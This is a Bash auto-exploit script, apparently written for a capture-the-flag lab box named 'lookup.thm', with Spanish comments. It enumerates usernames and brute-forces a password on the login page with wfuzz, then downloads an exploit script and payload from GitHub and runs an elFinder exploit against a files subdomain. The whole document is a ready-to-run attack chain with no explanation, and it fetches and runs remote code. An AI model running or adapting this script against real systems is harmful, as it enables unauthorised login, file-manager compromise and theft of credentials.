#!/bin/bash

dominio="lookup.thm"
subdominio="files.lookup.thm"

read -p "Ingresa la ip: " ip


echo "$ip $dominio $subdominio" >> /etc/hosts


echo -e "[+] Buscando usuarios: \n"

sudo wfuzz --hw=10 -c -t 100 -w /usr/share/SecLists/Usernames/Names/names.txt -H "Cookie: login_status=success"  -f file.txt -d "username=FUZZ&password=nose" http://lookup.thm/login.php 1>/dev/null

cat file.txt | grep -i ch| awk 'NR>1{print "Usuario: "$NF " encontrado"}'| tr -d '"' && rm file.txt

echo -e "\n[+] Probando credenciales... \n"

sudo wfuzz --hc=200 -t 100 -c -w /usr/share/wordlists/fasttrack.txt -f session.txt -H "Cookie: login_status=success" -d "username=jose&password=FUZZ" http://lookup.thm/login.php 1>/dev/null
cat session.txt | grep -i 302 | awk '{print "Password encontrada para jose: "$NF}'| tr -d '"' && rm session.txt

echo -e "\nExploit para el finder encontrado"
echo "Descargando y ejecutando..."

wget -q https://raw.githubusercontent.com/shosdoo/AutoPwn_lookupTHM/refs/heads/main/SecSignal.jpg -O SecSignal.jpg
wget -q https://raw.githubusercontent.com/shosdoo/AutoPwn_lookupTHM/refs/heads/main/elfinder.py -O elfinder.py

python2 elfinder.py http://files.lookup.thm/elFinder 1>/dev/null | tee passwd
cat passwd | grep -v "\[.*\]"


